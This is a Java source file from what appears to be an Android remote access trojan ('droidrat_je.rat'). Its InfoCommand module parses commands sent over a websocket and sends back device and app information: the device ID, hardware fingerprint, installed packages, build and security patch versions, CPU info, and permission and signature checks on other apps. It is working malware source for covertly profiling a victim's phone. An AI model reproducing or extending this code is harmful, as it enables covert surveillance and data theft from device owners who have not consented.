package com.je_chen.droidrat_je.rat.command;

import android.content.Context;
import android.content.pm.PackageManager;
import android.content.pm.ResolveInfo;
import android.util.Log;

import com.je_chen.droidrat_je.rat.command.process_super.CommandFather;
import com.je_chen.droidrat_je.rat.modules.appsinfo.getinfo.GetPackagesInfo;
import com.je_chen.droidrat_je.rat.modules.appsinfo.getinfo.GetPhoneInfo;

import java.util.List;

import static com.je_chen.droidrat_je.service.command.ProcessCommandService.websockets;


public class InfoCommand extends CommandFather {

    private final String TAG = "Info Event ";

    private GetPackagesInfo getPackagesInfo;

    private GetPhoneInfo getPhoneInfo;

    public InfoCommand(PackageManager packageManager, Context context) {
        getPackagesInfo = new GetPackagesInfo(packageManager, context);
        getPhoneInfo = new GetPhoneInfo();
    }

    @Override
    public void send(String value) {
        websockets.send(value);
    }

    @Override
    public void processCommand(String command) {
        try {
            String[] rawCommandArray = command.split(" ");
            switch (rawCommandArray[1]) {
                // Package Info

                case "ResolveInfo":
                    Log.d(TAG, "Info ResolveInfo");
                    List<ResolveInfo> resolveInfoList = getPackagesInfo.getResolveInfo();
                    for (int count = 0; count < resolveInfoList.size(); count++)
                        this.send("Info ResolveInfo " + resolveInfoList.get(count));
                    break;

                case "InstalledPackages":
                    Log.d(TAG, "Info InstalledPackages");
                    for (String appName : getPackagesInfo.getInstalledPackages())
                        this.send("Info InstalledPackages " + appName);
                    break;

                case "AnotherPermission":
                    String anotherPermissionPermissionName = rawCommandArray[2];
                    String anotherPermissionPackageName = rawCommandArray[3];
                    Log.d(TAG, "Info AnotherPermission" + "\nanotherPermissionPermissionName->" + anotherPermissionPermissionName + "\nanotherPermissionPackageName->" + anotherPermissionPackageName);
                    getPackagesInfo.checkAnotherPermission(anotherPermissionPermissionName, anotherPermissionPackageName);
                    this.send("Info AnotherPermission " + "\nanotherPermissionPermissionName->" + anotherPermissionPermissionName + "\nanotherPermissionPackageName->" + anotherPermissionPackageName);
                    break;

                case "AnotherSignature":
                    String uid1 = rawCommandArray[2];
                    String uid2 = rawCommandArray[3];
                    Log.d(TAG, "Info AnotherSignature" + "\nuid1->" + uid1 + "\nuid2->" + uid2);
                    getPackagesInfo.checkAnotherSignature(Integer.parseInt(uid1), Integer.parseInt(uid2));
                    this.send("Info AnotherSignature " + "\nuid1->" + uid1 + "\nuid2->" + uid2);
                    break;

                case "PackageInfo":
                    String packageInfoPackageName = rawCommandArray[2];
                    Log.d(TAG, "Info PackageInfo " + "\npackageInfoPackageName->" + packageInfoPackageName);
                    getPackagesInfo.getPackageInfo(packageInfoPackageName);
                    this.send("Info PackageInfo " + "\npackageInfoPackageName->" + packageInfoPackageName);
                    break;

                case "ApplicationIcon":
                    String applicationIconPackageName = rawCommandArray[2];
                    Log.d(TAG, "Info ApplicationIcon" + "\napplicationIconPackageName->" + applicationIconPackageName);
                    getPackagesInfo.getApplicationIcon(applicationIconPackageName);
                    this.send("Info ApplicationIcon " + "\napplicationIconPackageName->" + applicationIconPackageName);
                    break;

                case "ApplicationInfo":
                    String applicationInfoPackageName = rawCommandArray[2];
                    String applicationInfoFlag = rawCommandArray[3];
                    Log.d(TAG, "Info ApplicationInfo" + "\napplicationInfoPackageName->" + applicationInfoPackageName + "\napplicationInfoFlag->" + applicationInfoFlag);
                    getPackagesInfo.getApplicationInfo(applicationInfoPackageName, Integer.parseInt(applicationInfoFlag));
                    this.send("Info ApplicationInfo " + "\napplicationInfoPackageName->" + applicationInfoPackageName + "\napplicationInfoFlag->" + applicationInfoFlag);
                    break;

                case "DeviceId":
                    Log.d(TAG, "Info DeviceId");
                    this.send("Info DeviceId " + getPackagesInfo.getDeviceId());
                    break;

                // Phone Info

                case "BOARD":
                    Log.d(TAG, "Info BOARD");
                    this.send("Info BOARD " + getPhoneInfo.getBOARD());
                    break;

                case "BOOTLOADER":
                    Log.d(TAG, "Info BOOTLOADER");
                    this.send("Info BOOTLOADER " + getPhoneInfo.getBOOTLOADER());
                    break;

                case "BRAND":
                    Log.d(TAG, "Info BRAND");
                    this.send("Info BRAND " + getPhoneInfo.getBRAND());
                    break;

                case "Device":
                    Log.d(TAG, "Info Device");
                    this.send("Info Device " + getPhoneInfo.getDevice());
                    break;

                case "Display":
                    Log.d(TAG, "Info Display");
                    this.send("Info Display " + getPhoneInfo.getDisplay());
                    break;

                case "FINGERPRINT":
                    Log.d(TAG, "Info FINGERPRINT");
                    this.send("Info FINGERPRINT " + getPhoneInfo.getFINGERPRINT());
                    break;

                case "HARDWARE":
                    Log.d(TAG, "Info HARDWARE");
                    this.send("Info HARDWARE " + getPhoneInfo.getHARDWARE());
                    break;

                case "HOST":
                    Log.d(TAG, "Info HOST");
                    this.send("Info HOST " + getPhoneInfo.getHOST());
                    break;

                case "ID":
                    Log.d(TAG, "Info ID");
                    this.send("Info ID " + getPhoneInfo.getID());
                    break;

                case "MANUFACTURER":
                    Log.d(TAG, "Info MANUFACTURER");
                    this.send("Info MANUFACTURER " + getPhoneInfo.getMANUFACTURER());
                    break;

                case "Model":
                    Log.d(TAG, "Info Model");
                    this.send("Info Model " + getPhoneInfo.getModel());
                    break;

                case "Product":
                    Log.d(TAG, "Info Product");
                    this.send("Info Product " + getPhoneInfo.getProduct());
                    break;

                case "TYPE":
                    Log.d(TAG, "Info TYPE");
                    this.send("Info TYPE " + getPhoneInfo.getTYPE());
                    break;

                case "USER":
                    Log.d(TAG, "Info USER");
                    this.send("Info USER " + getPhoneInfo.getUSER());
                    break;

                case "VERSION_INCREMENTAL":
                    Log.d(TAG, "Info VERSION_INCREMENTAL");
                    this.send("Info VERSION_INCREMENTAL " + getPhoneInfo.getVERSION_INCREMENTAL());
                    break;

                case "VERSION_RELEASE":
                    Log.d(TAG, "Info VERSION_RELEASE");
                    this.send("Info VERSION_RELEASE " + getPhoneInfo.getVERSION_RELEASE());
                    break;

                case "Time":
                    Log.d(TAG, "Info Time");
                    this.send("Info Time " + getPhoneInfo.getTime());
                    break;

                case "SDKVersion":
                    Log.d(TAG, "Info SDKVersion");
                    this.send("Info SDKVersion " + getPhoneInfo.getSDKVersion());
                    break;

                case "SecurityVersion":
                    Log.d(TAG, "Info SecurityVersion");
                    this.send("Info SecurityVersion " + getPhoneInfo.getSecurityVersion());
                    break;

                case "CPUInfo":
                    Log.d(TAG, "Info CPUInfo");
                    this.send("Info CPUInfo " + getPhoneInfo.getCPUInfo());
                    break;

                case "TotalInfo":
                    Log.d(TAG, "Info TotalInfo");
                    this.send("Info BOARD " + getPhoneInfo.getBOARD());
                    this.send("Info BOOTLOADER " + getPhoneInfo.getBOOTLOADER());
                    this.send("Info BRAND " + getPhoneInfo.getBRAND());
                    this.send("Info Device " + getPhoneInfo.getDevice());
                    this.send("Info Display " + getPhoneInfo.getDisplay());
                    this.send("Info FINGERPRINT " + getPhoneInfo.getFINGERPRINT());
                    this.send("Info HARDWARE " + getPhoneInfo.getHARDWARE());
                    this.send("Info HOST " + getPhoneInfo.getHOST());
                    this.send("Info ID " + getPhoneInfo.getID());
                    this.send("Info MANUFACTURER " + getPhoneInfo.getMANUFACTURER());
                    this.send("Info Model " + getPhoneInfo.getModel());
                    this.send("Info Product " + getPhoneInfo.getProduct());
                    this.send("Info TYPE " + getPhoneInfo.getTYPE());
                    this.send("Info USER " + getPhoneInfo.getUSER());
                    this.send("Info VERSION_INCREMENTAL " + getPhoneInfo.getVERSION_INCREMENTAL());
                    this.send("Info Time " + getPhoneInfo.getTime());
                    this.send("Info SDKVersion " + getPhoneInfo.getSDKVersion());
                    this.send("Info SecurityVersion " + getPhoneInfo.getSecurityVersion());
                    this.send("Info CPUInfo " + getPhoneInfo.getCPUInfo());
                    break;

            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
